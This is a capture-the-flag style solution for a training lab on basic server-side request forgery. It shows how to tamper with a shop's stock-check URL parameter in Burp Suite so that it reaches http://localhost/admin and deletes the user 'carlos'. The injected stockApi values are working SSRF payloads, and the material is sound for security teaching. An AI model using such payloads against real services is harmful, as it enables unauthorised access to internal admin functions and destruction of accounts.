@@ -1,0 +1,29 @@
+// Lab: Basic SSRF against the local server
+
+This lab has a stock check feature which fetches data from an internal system.
+
+To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
+
+
+
+
+// Solution
+
+1. Browse to /admin and observe that you can't directly access the admin page.
+
+2. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
+
+3. There we can see the following URL:
+
+stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D2
+
+4. Change the URL to:
+
+stockApi=http://localhost/admin
+
+Here we can see 2 users wiener and carlos and we need to delete carlos.
+
+
+5. So now hit the following URL to solve the lab:
+
+stockApi=http://localhost/admin/delete?username=carlos
